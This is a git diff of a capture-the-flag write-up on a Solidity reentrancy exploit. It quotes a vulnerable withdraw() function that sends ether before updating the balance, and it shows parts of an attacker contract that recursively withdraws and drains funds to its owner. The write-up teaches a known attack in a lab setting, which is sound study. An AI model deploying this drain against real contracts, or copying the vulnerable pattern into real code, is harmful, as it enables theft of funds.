@@ -7,9 +7,18 @@ Note: due to inefficiencies and issues with my code, I will not use my code, but
 
 I used remix to edit the attacking smart contract: https://remix.ethereum.org/
 
-Looking at the solidity contract given to us, the only line that stood out to me was line 62: msg.sender.call.value(amount)(). If it is returning ether to a payable smart contract, it will wait for the smart contract to finish executing the code in its fallback function before continuing. If an attacker smart contract recursively calls the withdraw() function, it will not subtract from the attacker’s balance until after refunding each recursive call. This means that an attacker can withdraw all the ether in the victim smart contract.
-
+Looking at the solidity contract given to us, the only line that stood out to me was line 62: `msg.sender.call.value(amount)()`. If it is returning ether to a payable smart contract, it will wait for the smart contract to finish executing the code in its fallback function before continuing, when it subtracts from the attacker's balance.
+```js
+function withdraw(uint256 amount) onlyWithMoney(amount) {
+    require(amount > 0);
+    msg.sender.call.value(amount)(); // This is called before the next line
+    balanceOf[msg.sender]-=amount; // If this function is called recursively, this won't happen until too late!
+    Withdraw(msg.sender, amount);
+}
 ```
+If an attacker smart contract recursively calls the withdraw() function, it will not subtract from the attacker’s balance until after refunding each recursive call. This means that an attacker can withdraw all the ether in the victim smart contract.
+
+```js
 // Start the attack
 function attack()  {
     performAttack = true;
@@ -30,7 +39,7 @@ function() payable {
 After successfully exploiting the contract, the flag can be obtained by
 transferring the ether to an owned wallet and calling get_flag.
 
-```
+```js
 function getJackpot(){
     dctf.withdraw(dctf.balance); // Withdraw monies just in case
     bool res = owner.send(this.balance); // Send all the ether to you
